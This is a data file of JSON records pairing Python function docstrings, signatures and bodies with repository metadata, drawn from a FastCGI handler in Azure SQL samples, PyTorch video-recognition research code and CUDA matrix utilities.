{"docstring": "\"\"\"sends a response w/ the given id, type, and content to the server.\nIf the content is streaming then an empty record is sent at the end to \nterminate the stream\"\"\"\n", "func_signal": "def send_response(stream, req_id, resp_type, content, streaming=True):\n", "code": "if not isinstance(content, bytes):\n    raise TypeError(\"content must be encoded before sending: %r\" % content)\n\noffset = 0\nwhile True:\n    len_remaining = max(min(len(content) - offset, 0xFFFF), 0)\n\n    data = struct.pack(\n        '>BBHHBB',\n        FCGI_VERSION_1,     # version\n        resp_type,          # type\n        req_id,             # requestIdB1:B0\n        len_remaining,      # contentLengthB1:B0\n        0,                  # paddingLength\n        0,                  # reserved\n    ) + content[offset:(offset + len_remaining)]\n\n    offset += len_remaining\n\n    os.write(stream.fileno(), data)\n    if len_remaining == 0 or not streaming:\n        break\nstream.flush()", "path": "django\\django-pyodbc-azure\\bin\\wfastcgi.py", "repo_name": "Azure/azure-sql-database-samples", "stars": 757, "license": "other", "language": "python", "size": 2137}
{"docstring": "\"\"\"reads the main fast cgi record\"\"\"\n", "func_signal": "def read_fastcgi_record(stream):\n", "code": "data = stream.read(8)     # read record\nif not data:\n    # no more data, our other process must have died...\n    raise _ExitException()\n\nfcgi_ver, reqtype, req_id, content_size, padding_len, _ = struct.unpack('>BBHHBB', data)\n\ncontent = stream.read(content_size)  # read content\nstream.read(padding_len)\n\nif fcgi_ver != FCGI_VERSION_1:\n    raise Exception('Unknown fastcgi version %s' % fcgi_ver)\n\nprocessor = REQUEST_PROCESSORS.get(reqtype)\nif processor is not None:\n    return processor(stream, req_id, content)\n\n# unknown type requested, send response\nlog('Unknown request type %s' % reqtype)\nsend_response(stream, req_id, FCGI_UNKNOWN_TYPE, chr(reqtype) + zero_bytes(7))\nreturn None", "path": "django\\django-pyodbc-azure\\bin\\wfastcgi.py", "repo_name": "Azure/azure-sql-database-samples", "stars": 757, "license": "other", "language": "python", "size": 2137}
{"docstring": "# Send any error message on FCGI_STDERR.\n", "func_signal": "def __exit__(self, exc_type, exc_value, exc_tb):\n", "code": "if exc_type and exc_type is not _ExitException:\n    error_msg = \"%s:\\n\\n%s\\n\\nStdOut: %s\\n\\nStdErr: %s\" % (\n        self.error_message or 'Error occurred',\n        ''.join(traceback.format_exception(exc_type, exc_value, exc_tb)),\n        self._get_output(),\n        self._get_errors(),\n    )\n    if not self.header_bytes or not self.sent_headers:\n        self.header_bytes = wsgi_encode('Status: 500 Internal Server Error\\r\\n')\n    self.send(FCGI_STDERR, wsgi_encode(error_msg))\n    # Best effort at writing to the log. It's more important to\n    # finish the response or the user will only see a generic 500\n    # error.\n    maybe_log(error_msg)\n\n# End the request. This has to run in both success and failure cases.\nself.send(FCGI_END_REQUEST, zero_bytes(8), streaming=False)\n\n# Remove the request from our global dict\ndel _REQUESTS[self.record.req_id]\n\n# Suppress all exceptions unless requested\nreturn not self.fatal_errors", "path": "django\\django-pyodbc-azure\\bin\\wfastcgi.py", "repo_name": "Azure/azure-sql-database-samples", "stars": 757, "license": "other", "language": "python", "size": 2137}
{"docstring": "\"\"\"reads the fastcgi request to get parameter values, and immediately \nresponds\"\"\"\n", "func_signal": "def read_fastcgi_get_values(stream, req_id, content):\n", "code": "offset = 0\nrequest = {}\nwhile offset < len(content):\n    offset, name, value = read_fastcgi_keyvalue_pairs(content, offset)\n    request[name] = value\n\nresponse = {}\nif FCGI_MAX_CONNS in request:\n    response[FCGI_MAX_CONNS] = '1'\n\nif FCGI_MAX_REQS in request:\n    response[FCGI_MAX_REQS] = '1'\n\nif FCGI_MPXS_CONNS in request:\n    response[FCGI_MPXS_CONNS] = '0'\n\nsend_response(\n    stream,\n    req_id,\n    FCGI_GET_VALUES_RESULT,\n    write_fastcgi_keyvalue_pairs(response)\n)", "path": "django\\django-mssql\\bin\\wfastcgi.py", "repo_name": "Azure/azure-sql-database-samples", "stars": 757, "license": "other", "language": "python", "size": 2137}
{"docstring": "\"\"\"Writes the length of a single name for a key or value in a key/value\nstream\"\"\"\n", "func_signal": "def get_encoded_int(i):\n", "code": "if i <= 0x7f:\n    return struct.pack('>B', i)\nelif i < 0x80000000:\n    return struct.pack('>I', i | 0x80000000)\nelse:\n    raise ValueError('cannot encode value %s (%x) because it is too large' % (i, i))", "path": "django\\django-pyodbc-azure\\bin\\wfastcgi.py", "repo_name": "Azure/azure-sql-database-samples", "stars": 757, "license": "other", "language": "python", "size": 2137}
{"docstring": "# Send any error message on FCGI_STDERR.\n", "func_signal": "def __exit__(self, exc_type, exc_value, exc_tb):\n", "code": "if exc_type and exc_type is not _ExitException:\n    error_msg = \"%s:\\n\\n%s\\n\\nStdOut: %s\\n\\nStdErr: %s\" % (\n        self.error_message or 'Error occurred',\n        ''.join(traceback.format_exception(exc_type, exc_value, exc_tb)),\n        self._get_output(),\n        self._get_errors(),\n    )\n    if not self.header_bytes or not self.sent_headers:\n        self.header_bytes = wsgi_encode('Status: 500 Internal Server Error\\r\\n')\n    self.send(FCGI_STDERR, wsgi_encode(error_msg))\n    # Best effort at writing to the log. It's more important to\n    # finish the response or the user will only see a generic 500\n    # error.\n    maybe_log(error_msg)\n\n# End the request. This has to run in both success and failure cases.\nself.send(FCGI_END_REQUEST, zero_bytes(8), streaming=False)\n\n# Remove the request from our global dict\ndel _REQUESTS[self.record.req_id]\n\n# Suppress all exceptions unless requested\nreturn not self.fatal_errors", "path": "django\\django-mssql\\bin\\wfastcgi.py", "repo_name": "Azure/azure-sql-database-samples", "stars": 757, "license": "other", "language": "python", "size": 2137}
{"docstring": "\"\"\"reads the begin request body and updates our _REQUESTS table to include\nthe new request\"\"\"\n#    typedef struct {\n#        unsigned char roleB1;\n#        unsigned char roleB0;\n#        unsigned char flags;\n#        unsigned char reserved[5];\n#    } FCGI_BeginRequestBody;\n\n# TODO: Ignore request if it exists\n", "func_signal": "def read_fastcgi_begin_request(stream, req_id, content):\n", "code": "res = FastCgiRecord(\n    FCGI_BEGIN_REQUEST,\n    req_id,\n    (ord(content[0]) << 8) | ord(content[1]),   # role\n    ord(content[2]),  # flags\n)\n_REQUESTS[req_id] = res", "path": "django\\django-mssql\\bin\\wfastcgi.py", "repo_name": "Azure/azure-sql-database-samples", "stars": 757, "license": "other", "language": "python", "size": 2137}
{"docstring": "\"\"\"reads FastCGI std-in and stores it in wsgi.input passed in the\nwsgi environment array\"\"\"\n", "func_signal": "def read_fastcgi_input(stream, req_id, content):\n", "code": "res = _REQUESTS[req_id].params\nif 'wsgi.input' not in res:\n    res['wsgi.input'] = content\nelse:\n    res['wsgi.input'] += content\n\nif not content:\n    # we've hit the end of the input stream, time to process input...\n    return _REQUESTS[req_id]", "path": "django\\django-pyodbc-azure\\bin\\wfastcgi.py", "repo_name": "Azure/azure-sql-database-samples", "stars": 757, "license": "other", "language": "python", "size": 2137}
{"docstring": "\"\"\"Tests the home page.\"\"\"\n", "func_signal": "def test_home(self):\n", "code": "response = self.client.get('/')\nself.assertContains(response, 'Polls.', 1, 200)", "path": "django\\django-pymssql\\app\\tests.py", "repo_name": "Azure/azure-sql-database-samples", "stars": 757, "license": "other", "language": "python", "size": 2137}
{"docstring": "# the dataset returns a list, which gets wrapped in a list, we just unwrap the list\n# and feed it to the original dataloader\n", "func_signal": "def cat_collate(batch):\n", "code": "assert len(batch) == 1, 'something wrong with val video dataset'\nreturn my_collate(batch[0])", "path": "datasets\\get.py", "repo_name": "gsig/PyVideoResearch", "stars": 527, "license": "gpl-3.0", "language": "python", "size": 653}
{"docstring": "# x is of the form b x n x h x w x c\n# model expects b x c x n x h x w\n", "func_signal": "def forward(self, x):\n", "code": "x = x.permute(0, 4, 1, 2, 3)\n\nx = self.conv1(x)\nx = self.bn1(x)\nx = self.relu(x)\nx = self.maxpool(x)\n\nx = self.layer1(x)\nx = self.maxpool2(x)\nx = self.layer2(x)\nx = self.layer3(x)\nx = self.layer4(x)\n\nx = self.avgpool(x)\nx = self.dropout(x)\nlogits = self.fc(x)\n\nlogits = logits.mean(3).mean(3)\n# model returns batch x classes x time\nlogits = logits.permute(0, 2, 1)\n# logits is batch X time X classes\nif self.global_pooling:\n    logits = logits.mean(1)\nreturn logits", "path": "models\\bases\\resnet50_3d.py", "repo_name": "gsig/PyVideoResearch", "stars": 527, "license": "gpl-3.0", "language": "python", "size": 653}
{"docstring": "\"\"\"Computes the precision@k for the specified values of k\"\"\"\n", "func_signal": "def accuracy(output, target, topk=(1,)):\n", "code": "if target.dim() == 3:\n    target = target.max(dim=1)[0]\nmaxk = max(topk)\nbatch_size = target.size(0)\n\n_, pred = output.topk(maxk, 1, True, True)\npred = pred.t()\nif len(target.shape) == 1:\n    print('computing accuracy for single-label case')\n    correct = pred.eq(target.view(1, -1).expand_as(pred))\nelse:\n    print('computing accuracy for multi-label case')\n    correct = torch.zeros(*pred.shape)\n    for i in range(correct.shape[0]):\n        for j in range(correct.shape[1]):\n            correct[i, j] = target[j, pred[i, j]] > 0.5\n\nres = []\nfor k in topk:\n    correct_k = correct[:k].view(-1).float().sum(0, keepdim=True)\n    res.append(correct_k.mul_(100.0 / batch_size))\nreturn res", "path": "metrics\\utils.py", "repo_name": "gsig/PyVideoResearch", "stars": 527, "license": "gpl-3.0", "language": "python", "size": 653}
{"docstring": "\"\"\"\nApproximate version of the charades evaluation function\nFor precise numbers, use the submission file with the official matlab script\n\"\"\"\n", "func_signal": "def charades_map(submission_array, gt_array):\n", "code": "fix = submission_array.copy()\nempty = np.sum(gt_array, axis=1) == 0\nfix[empty, :] = np.NINF\nreturn map(fix, gt_array)", "path": "metrics\\utils.py", "repo_name": "gsig/PyVideoResearch", "stars": 527, "license": "gpl-3.0", "language": "python", "size": 653}
{"docstring": "# target is a batch x n_class tensor\n# where the rows for ego triplets are one, padded by zeros\n# and class labels are negative\n", "func_signal": "def forward(self, dist_a, dist_b, x, y, z, cls, target, meta, synchronous=False):\n", "code": "ids = meta['id']\ninds1 = [i for i, t in enumerate(target) if t[0].item() > 0]\ninds2 = [i for i, t in enumerate(target) if t[0].item() <= 0]\nprint('#triplets: {} \\t #class: {}'.format(len(inds1), len(inds2)))\nfinal = []\n\n# ActorObserverLoss\nif len(inds1) > 0:\n    vars1 = var_subset([dist_a, dist_b, x, y, z, target[:, 0]], inds1)\n    vars1 += [{'id': [ids[i] for i in inds1]}]\n    pred, f, targ = super(ActorObserverWithSoftmaxCriterion, self).forward(*vars1)\n    final.append(f)\nelse:\n    pred = {'triplet_prediction': [], 'weights': []}\n    targ = {'triplet_target': []}\n\n# Classification loss\ninds2 = [i for i in inds2 if target[i].sum() != 0]\nif len(inds2) > 0:\n    cls2, target2 = var_subset([cls, -target.long()], inds2)\n    b = target2.shape[0]\n    oldsoftmax_target = torch.LongTensor(b).zero_()\n    for i in range(b):\n        if target2[i].sum() == 0:\n            oldsoftmax_target[i] = target2.shape[1]\n        else:\n            oldsoftmax_target[i] = random.choice(target2[i].nonzero())\n    target2 = oldsoftmax_target.to(target2.device)\n\n    clsloss = self.clsloss(cls2, target2)\n    f = self.clsweight * clsloss.sum()\n    final.append(f)\nelse:\n    cls2 = target2 = torch.Tensor([])\n\nprint('losses:', ' '.join(['{}'.format(r.item()) for r in final]))\npred['class_prediction'] = nn.Softmax()(cls2.detach().cpu())\ntarg['class_target'] = target2.detach().cpu()\nreturn pred, sum(final), targ", "path": "models\\criteria\\actor_observer_with_softmax_criterion.py", "repo_name": "gsig/PyVideoResearch", "stars": 527, "license": "gpl-3.0", "language": "python", "size": 653}
{"docstring": "'''\n:param x: (b, c, t, h, w)\n:return:\n'''\n\n", "func_signal": "def forward(self, x):\n", "code": "if self.group_size is not None:\n    b, c, t, h, w = x.shape\n    # x = x.reshape(-1, c, self.group_size, h, w)\n    x = x.permute(0, 2, 1, 3, 4)\n    x = x.reshape(-1, self.group_size, c, h, w)\n    x = x.permute(0, 2, 1, 3, 4)\n\nif self.mode == 'embedded_gaussian':\n    output = self._embedded_gaussian(x)\nelif self.mode == 'dot_product':\n    output = self._dot_product(x)\nelif self.mode == 'concatenation':\n    output = self._concatenation(x)\nelif self.mode == 'gaussian':\n    output = self._gaussian(x)\n\nif self.group_size is not None:\n    b2, c2, t2, h2, w2 = output.shape\n    output = output.permute(0, 2, 1, 3, 4)\n    output = output.reshape(b, -1, c2, h2, w2)\n    output = output.permute(0, 2, 1, 3, 4)\nreturn output", "path": "models\\layers\\nonlocal_block_3d.py", "repo_name": "gsig/PyVideoResearch", "stars": 527, "license": "gpl-3.0", "language": "python", "size": 653}
{"docstring": "# target is a batch x n_class tensor\n# where the rows for ego triplets are one, padded by zeros\n# and class labels are negative\n", "func_signal": "def forward(self, dist_a, dist_b, x, y, z, cls, target, meta, synchronous=False):\n", "code": "ids = meta['id']\ninds1 = [i for i, t in enumerate(target) if t[0].item() > 0]\ninds2 = [i for i, t in enumerate(target) if t[0].item() <= 0]\nprint('#triplets: {} \\t #class: {}'.format(len(inds1), len(inds2)))\nfinal = []\n\n# TripletLoss\nif len(inds1) > 0:\n    vars1 = var_subset([dist_a, dist_b, x, y, z, target[:, 0]], inds1)\n    vars1 += [{'id': [ids[i] for i in inds1]}]\n    pred, f, targ = super(TripletWithClassifierCriterion, self).forward(*vars1)\n    final.append(f)\nelse:\n    pred = {'triplet_prediction': [], 'weights': []}\n    targ = {'triplet_target': []}\n\n# Classification loss\nif len(inds2) > 0:\n    cls2, target2 = var_subset([cls, -target.long()], inds2)\n    clsloss = self.clsloss(nn.Sigmoid()(cls2), target2.float())\n    clsloss = clsloss.mean(1)\n    f = self.clsweight * clsloss.sum()\n    final.append(f)\nelse:\n    cls2 = target2 = torch.Tensor([])\n\nprint('losses:', ' '.join(['{}'.format(r.item()) for r in final]))\npred['class_prediction'] = cls2.detach().cpu()\ntarg['class_target'] = target2.detach().cpu()\nreturn pred, sum(final), targ", "path": "models\\criteria\\triplet_with_classifier_criterion.py", "repo_name": "gsig/PyVideoResearch", "stars": 527, "license": "gpl-3.0", "language": "python", "size": 653}
{"docstring": "# convert target to a matrix of zeros and ones\n", "func_signal": "def gtmat(sizes, target):\n", "code": "out = torch.zeros(*sizes)\nfor i, t in enumerate(target):\n    t = t.item() if type(t) is torch.Tensor else t\n    if len(sizes) == 3:\n        out[i, t, :] = 1\n    else:\n        out[i, t] = 1\nif type(target) is Variable:\n    return Variable(out.cuda())\nelse:\n    return out.cuda()", "path": "models\\layers\\utils.py", "repo_name": "gsig/PyVideoResearch", "stars": 527, "license": "gpl-3.0", "language": "python", "size": 653}
{"docstring": "\"\"\" Returns mAP, weighted mAP, and AP array \"\"\"\n", "func_signal": "def map(submission_array, gt_array):\n", "code": "m_aps = []\nn_classes = submission_array.shape[1]\nfor oc_i in range(n_classes):\n    sorted_idxs = np.argsort(-submission_array[:, oc_i])\n    tp = gt_array[:, oc_i][sorted_idxs] == 1\n    fp = np.invert(tp)\n    n_pos = tp.sum()\n    if n_pos < 0.1:\n        m_aps.append(float('nan'))\n        continue\n    fp.sum()\n    f_pcs = np.cumsum(fp)\n    t_pcs = np.cumsum(tp)\n    prec = t_pcs / (f_pcs+t_pcs).astype(float)\n    avg_prec = 0\n    for i in range(submission_array.shape[0]):\n        if tp[i]:\n            avg_prec += prec[i]\n    m_aps.append(avg_prec / n_pos.astype(float))\nm_aps = np.array(m_aps)\nm_ap = np.nanmean(m_aps)\nw_ap = (m_aps * gt_array.sum(axis=0) / gt_array.sum().sum().astype(float))\nreturn m_ap, w_ap, m_aps", "path": "metrics\\utils.py", "repo_name": "gsig/PyVideoResearch", "stars": 527, "license": "gpl-3.0", "language": "python", "size": 653}
{"docstring": "\"\"\" TODO \"\"\"\n", "func_signal": "def adjust_learning_rate(startlr, decay_rate, optimizer, epoch):\n", "code": "if type(decay_rate) == int:\n    decay_rate = '{}'.format(decay_rate)\nif ',' not in decay_rate:\n    decay_rate = int(decay_rate)\n    decay_rate = '{},{},{}'.format(decay_rate, 2*decay_rate, 3*decay_rate)\ndecay_rates = [int(x) for x in decay_rate.split(',')]\nlr = startlr\nfor d in decay_rates:\n    if epoch >= d:\n        lr *= 0.1\nprint('lr = {}'.format(lr))\nfor param_group in optimizer.param_groups:\n    param_group['lr'] = lr", "path": "train.py", "repo_name": "gsig/PyVideoResearch", "stars": 527, "license": "gpl-3.0", "language": "python", "size": 653}
{"docstring": "# normalize tensor in log space to have unit sum for each row\n", "func_signal": "def unit(x):\n", "code": "minx, _ = x.max(1)\nz = (x - minx[:, None]).exp().sum(1).log() + minx\nreturn x - z[:, None]", "path": "models\\layers\\utils.py", "repo_name": "gsig/PyVideoResearch", "stars": 527, "license": "gpl-3.0", "language": "python", "size": 653}
{"docstring": "# keep a queue of size maxsize for each id\n# messages are stored in normal space\n# queue for each id is stored in the order in which the messages were stored\n", "func_signal": "def mset(self, msg, idtime, storage, mask):\n", "code": "for m, (ids, time), keep in sorted(zip(msg, idtime, mask), key=lambda x: random()):\n    if not keep:\n        continue\n    if ids not in storage:\n        storage[ids] = []\n    data = m if type(m) is not torch.Tensor else m.data.cpu()\n    storage[ids].append((time, data))\n    if len(storage[ids]) > self.maxsize:\n        del storage[ids][0]", "path": "models\\criteria\\async_tf_criterion.py", "repo_name": "gsig/PyVideoResearch", "stars": 527, "license": "gpl-3.0", "language": "python", "size": 653}
{"docstring": "# compounding weight\n", "func_signal": "def avg(iterator, weight=1.):\n", "code": "item, w = next(iterator)\ntotal = item.clone() * w\nn = 1.\nfor i, (item, w) in enumerate(iterator):\n    w1 = 1. * weight**(i + 1)\n    total += item * w1 * w\n    n += w1\nreturn total / n", "path": "models\\layers\\utils.py", "repo_name": "gsig/PyVideoResearch", "stars": 527, "license": "gpl-3.0", "language": "python", "size": 653}
{"docstring": "# a and b are batched vectors, X is batched matrix\n# returns a^t * X * b\n", "func_signal": "def axb(a, x, b):\n", "code": "xb = torch.bmm(x, b[:, :, None])\nreturn (a * xb.squeeze()).sum(1)", "path": "models\\layers\\utils.py", "repo_name": "gsig/PyVideoResearch", "stars": 527, "license": "gpl-3.0", "language": "python", "size": 653}
{"docstring": "# Fix for avoiding degenerate autograd graph building\n# that causes out of gpu memory\n", "func_signal": "def hack(inds1, inds2):\n", "code": "fix0 = 1.0\nfixweights = 1.0\nif len(inds1) == 0:\n    inds1.append(0)\n    fix0 = 0.0\n    fixweights = 0.0\nif len(inds2) == 0:\n    inds2.append(0)\n    fix0 = 0.0\n\ndef fix(final0, weights):\n    return final0 * fix0, weights * fixweights\n\nreturn fix", "path": "models\\criteria\\actor_observer_with_classifier_old_criterion.py", "repo_name": "gsig/PyVideoResearch", "stars": 527, "license": "gpl-3.0", "language": "python", "size": 653}
{"docstring": "'''\n:param x: (b, c, t, h, w)\n:return:\n'''\n\n", "func_signal": "def forward(self, x):\n", "code": "if self.group_size is not None:\n    b, c, t, h, w = x.shape\n    # x = x.reshape(-1, c, self.group_size, h, w)\n    x = x.permute(0, 2, 1, 3, 4)\n    x = x.reshape(-1, self.group_size, c, h, w)\n    x = x.permute(0, 2, 1, 3, 4)\n\nif self.mode == 'embedded_gaussian':\n    output = self._embedded_gaussian(x)\nelif self.mode == 'dot_product':\n    output = self._dot_product(x)\nelif self.mode == 'concatenation':\n    output = self._concatenation(x)\nelif self.mode == 'gaussian':\n    output = self._gaussian(x)\n\nif self.group_size is not None:\n    b2, c2, t2, h2, w2 = output.shape\n    output = output.permute(0, 2, 1, 3, 4)\n    output = output.reshape(b, -1, c2, h2, w2)\n    output = output.permute(0, 2, 1, 3, 4)\nreturn output", "path": "models\\layers\\nonlocal_block_3d_no_init.py", "repo_name": "gsig/PyVideoResearch", "stars": 527, "license": "gpl-3.0", "language": "python", "size": 653}
{"docstring": "\"\"\"\n    Validate in the same approach as training\n\"\"\"\n", "func_signal": "def validate(self, loader, model, criterion, epoch, metrics, args):\n", "code": "with torch.no_grad():\n    return self.train(loader, model, criterion, None, epoch, metrics, args, validate=True)", "path": "train.py", "repo_name": "gsig/PyVideoResearch", "stars": 527, "license": "gpl-3.0", "language": "python", "size": 653}
{"docstring": "# input is b, t, ...\n", "func_signal": "def forward(self, x, meta):\n", "code": "s = x.shape\nb, t = s[0], s[1]\nx = x.reshape(-1, *s[2:])\nout = self.basenet(x)\nout = out.reshape(b, t, *out.shape[1:])\n#return self.consensus(out)\nreturn out", "path": "models\\wrappers\\tsn_base2.py", "repo_name": "gsig/PyVideoResearch", "stars": 527, "license": "gpl-3.0", "language": "python", "size": 653}
{"docstring": "# @Hongyi_Zhang\n# assumes soft_target is normalized to 1 and between [0,1]\n# logdist is a (normalized) log distribution\n", "func_signal": "def nll_loss(soft_target, logdist, reduce=True):\n", "code": "logdist = unit((logdist.exp() + 0.00001).log())  # for numerical stability\nif soft_target.dim() == 3:\n    out = (-soft_target * logdist).sum(2).sum(1)\nelse:\n    out = (-soft_target * logdist).sum(1)\nif reduce:\n    return out.mean()\nelse:\n    return out", "path": "models\\layers\\utils.py", "repo_name": "gsig/PyVideoResearch", "stars": 527, "license": "gpl-3.0", "language": "python", "size": 653}
{"docstring": "\"\"\" assuming:\n    x: first person positive\n    y: third person\n    z: first person negative\n\"\"\"\n", "func_signal": "def forward(self, x, y, z):\n", "code": "base_x = self.basenet(x)\nbase_y = self.basenet(y)\nw_x = self.firstpos_fc(base_x).view(-1) * torch.exp(self.firstpos_scale)\nw_y = self.third_fc(base_x).view(-1) * torch.exp(self.third_scale)\nprint('fc7 norms:', base_x.norm().item(), base_y.norm().item())\nself.verbose()\nreturn base_x, base_y, w_x, w_y", "path": "models\\wrappers\\actor_observer_fc7_wrapper.py", "repo_name": "gsig/PyVideoResearch", "stars": 527, "license": "gpl-3.0", "language": "python", "size": 653}
{"docstring": "\"\"\"Compute loss and also deriv w.r.t to it if asked for.\n\nCompute the loss function. Targets should be in self.data, predictions\nshould be in self.state.\nArgs:\n  get_deriv: If True, compute the derivative w.r.t the loss function and put\n    it in self.deriv.\n\"\"\"\n", "func_signal": "def GetLoss(self, get_deriv=False, acc_deriv=False, **kwargs):\n", "code": "perf = deepnet_pb2.Metrics()\nperf.MergeFrom(self.proto.performance_stats)\nperf.count = self.batchsize\ntiny = self.tiny\nif self.loss_function == deepnet_pb2.Layer.CROSS_ENTROPY:\n  data = self.data\n  state = self.state\n  temp1 = self.statesize\n\n  cm.cross_entropy_bernoulli(data, state, target=temp1, tiny=self.tiny)\n  perf.cross_entropy = temp1.sum()\n   \n  cm.correct_preds(data, state, target=temp1, cutoff=0.5)\n  perf.correct_preds = temp1.sum()\n\n  if get_deriv:\n    self.state.subtract(self.data, target=self.deriv)\n\nelif self.loss_function == deepnet_pb2.Layer.SQUARED_LOSS:\n  target = self.statesize\n  self.state.subtract(self.data, target=target)\n  error = target.euclid_norm()**2\n  perf.error = error\n  if acc_deriv:\n    self.deriv.add_mult(target, alpha=self.loss_weight)\n  else:\n    self.deriv.assign(target)\n  if get_deriv:\n    self.ComputeDeriv()\nelse:\n  raise Exception('Unknown loss function for logistic units.')\n\nreturn perf", "path": "deepnet\\logistic_layer.py", "repo_name": "nitishsrivastava/deepnet", "stars": 894, "license": "bsd-3-clause", "language": "python", "size": 42936}
{"docstring": "\"\"\"\nApply sin to each element of the matrix mat.\n\"\"\"\n\n", "func_signal": "def sin(mat, target = None):\n", "code": "if not target:\n    target = mat\n\nerr_code = _cudamat.apply_sin(mat.p_mat, target.p_mat)\nif err_code:\n    raise generate_exception(err_code)\n\nreturn target", "path": "cudamat\\cudamat.py", "repo_name": "nitishsrivastava/deepnet", "stars": 894, "license": "bsd-3-clause", "language": "python", "size": 42936}
{"docstring": "\"\"\"\nSum the matrix along the given dimension, where 0 represents the leading\ndimension and 1 represents the non-leading dimension. If None, the sum\nof all elements is returned. If a target is not prvided, a new vector is\ncreated for storing the result.\n\"\"\"\n", "func_signal": "def sum(self, axis=None, target = None):\n", "code": "if axis is None:\n  return vdot(self, CUDAMatrix.ones.slice(0, self.shape[0]*self.shape[1]))\nelse:\n  return sum(self, axis, target)", "path": "cudamat\\cudamat.py", "repo_name": "nitishsrivastava/deepnet", "stars": 894, "license": "bsd-3-clause", "language": "python", "size": 42936}
{"docstring": "\"\"\"\nPerform the operation target = (self > val) ? val:self, where val can be a matrix or a scalar.\n\"\"\"\n", "func_signal": "def upper_bound(self, val, target = None):\n", "code": "if not target:\n    target = self\n\nif isinstance(val, (int, float)):\n    err_code = _cudamat.upper_bound_scalar(self.p_mat, ct.c_float(val), target.p_mat)\nelse:\n    err_code = _cudamat.upper_bound(self.p_mat, val.p_mat, target.p_mat)\n\nif err_code:\n    raise generate_exception(err_code)\n\nreturn target", "path": "cudamat\\cudamat.py", "repo_name": "nitishsrivastava/deepnet", "stars": 894, "license": "bsd-3-clause", "language": "python", "size": 42936}
{"docstring": "\"\"\"\nCopy the matrix to the CPU.\n\"\"\"\n\n", "func_signal": "def copy_to_host(self):\n", "code": "if not self.mat.on_host:\n    # allocate host storage if necessary\n    m = self.mat.size[0]\n    n = self.mat.size[1]\n\n    self.numpy_array = np.empty((m, n), dtype=np.float32, order = 'F')\n    self.mat.data_host = self.numpy_array.ctypes.data_as(ct.POINTER(ct.c_float))\n\n    self.mat.on_host = 1\n\nerr_code = _cudamat.copy_to_host(self.p_mat)\nif err_code:\n    raise generate_exception(err_code)", "path": "cudamat\\cudamat.py", "repo_name": "nitishsrivastava/deepnet", "stars": 894, "license": "bsd-3-clause", "language": "python", "size": 42936}
{"docstring": "\"\"\"\nMultiply the matrix by a scalar.\n\"\"\"\n\n", "func_signal": "def mult_by_scalar(self, alpha, target = None):\n", "code": "if not target:\n    target = self\n\nerr_code = _cudamat.mult_by_scalar(self.p_mat, ct.c_float(alpha), target.p_mat)\nif err_code:\n    raise generate_exception(err_code)\n\nreturn target", "path": "cudamat\\cudamat.py", "repo_name": "nitishsrivastava/deepnet", "stars": 894, "license": "bsd-3-clause", "language": "python", "size": 42936}
{"docstring": "\"\"\"\nimages - (n_images, img_w**2 * n_chans)\nfilters - (n_filters, filter_w**2 * n_chans)\ntargets - (n_images, n_locs**2 * n_filters)\nnumModulesX - Number of filter locations along an axis. = n_locs\npaddingStart - Set to k for a k-pixel border of zeros. Usually set to 0.\nmoduleStride - stride to move the filters by. \nnumImgColors - n_chans\n\"\"\"\n", "func_signal": "def localUp(images, filters, targets, numModulesX, paddingStart, moduleStride, numImgColors, numGroups=1):\n", "code": "numImages = images.shape[0]\nnumFilters = filters.shape[0]\n\nassert targets.shape == (numImages, numFilters * numModulesX * numModulesX), '%s %d %d-%d-%d' % (targets.shape.__str__(), numImages, numFilters, numModulesX, numModulesX)\n\n_ConvNet.localUp(images.p_mat, filters.p_mat, targets.p_mat,\n         numModulesX, -paddingStart, moduleStride, numImgColors, numGroups)", "path": "cudamat\\cudamat_conv.py", "repo_name": "nitishsrivastava/deepnet", "stars": 894, "license": "bsd-3-clause", "language": "python", "size": 42936}
{"docstring": "\"\"\"\nInitialize and seed the random number generator.\n\"\"\"\n\n", "func_signal": "def init_random(seed = 0):\n", "code": "NUM_RND_STREAMS = 96*128\nCUDAMatrix.rndInitialized = 1\nCUDAMatrix.rnd_state = rnd_struct()\nCUDAMatrix.rnd_state_p = ct.pointer(CUDAMatrix.rnd_state)\n\ncudamat_path = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'rnd_multipliers_32bit.txt')\n\nerr_code = _cudamat.init_random(CUDAMatrix.rnd_state_p, ct.c_int(seed), cudamat_path)\nif err_code:\n    raise generate_exception(err_code)", "path": "cudamat\\cudamat.py", "repo_name": "nitishsrivastava/deepnet", "stars": 894, "license": "bsd-3-clause", "language": "python", "size": 42936}
{"docstring": "\"\"\"\nSelects the CUDA device with the given ID.\n\"\"\"\n\n", "func_signal": "def cuda_set_device(dev_id):\n", "code": "err_code =  _cudamat.cuda_set_device(ct.c_int(dev_id))\nif err_code:\n    raise generate_exception(err_code)", "path": "cudamat\\cudamat.py", "repo_name": "nitishsrivastava/deepnet", "stars": 894, "license": "bsd-3-clause", "language": "python", "size": 42936}
{"docstring": "\"\"\"\nSample a bernoulli distribution. Choose 1 with probability given by entries of (1+self)/2, -1 otherwise.\n\"\"\"\n", "func_signal": "def sample_bernoulli_tanh(self, target=None):\n", "code": "if not target:\n  target = self\nerr_code = _cudamat.sample_bernoulli_tanh(CUDAMatrix.rnd_state_p, self.p_mat, target.p_mat)\nif err_code:\n    raise generate_exception(err_code)\n\nreturn self", "path": "cudamat\\cudamat.py", "repo_name": "nitishsrivastava/deepnet", "stars": 894, "license": "bsd-3-clause", "language": "python", "size": 42936}
{"docstring": "\"\"\"\nPerform the operation target = 1. * (self > val), where val can be a matrix or a scalar.\n\"\"\"\n\n", "func_signal": "def greater_than(self, val, target = None):\n", "code": "if not target:\n    target = self\n\nif isinstance(val, (int, float)):\n    err_code = _cudamat.greater_than_scalar(self.p_mat, ct.c_float(val), target.p_mat)\nelse:\n    err_code = _cudamat.greater_than(self.p_mat, val.p_mat, target.p_mat)\n\nif err_code:\n    raise generate_exception(err_code)\n\nreturn target", "path": "cudamat\\cudamat.py", "repo_name": "nitishsrivastava/deepnet", "stars": 894, "license": "bsd-3-clause", "language": "python", "size": 42936}
{"docstring": "\"\"\"\nApply the ceil function to each element of the matrix mat.\n\"\"\"\n\n", "func_signal": "def ceil(mat, target = None):\n", "code": "if not target:\n    target = mat\n\nerr_code = _cudamat.apply_ceil(mat.p_mat, target.p_mat)\nif err_code:\n    raise generate_exception(err_code)\n\nreturn target", "path": "cudamat\\cudamat.py", "repo_name": "nitishsrivastava/deepnet", "stars": 894, "license": "bsd-3-clause", "language": "python", "size": 42936}
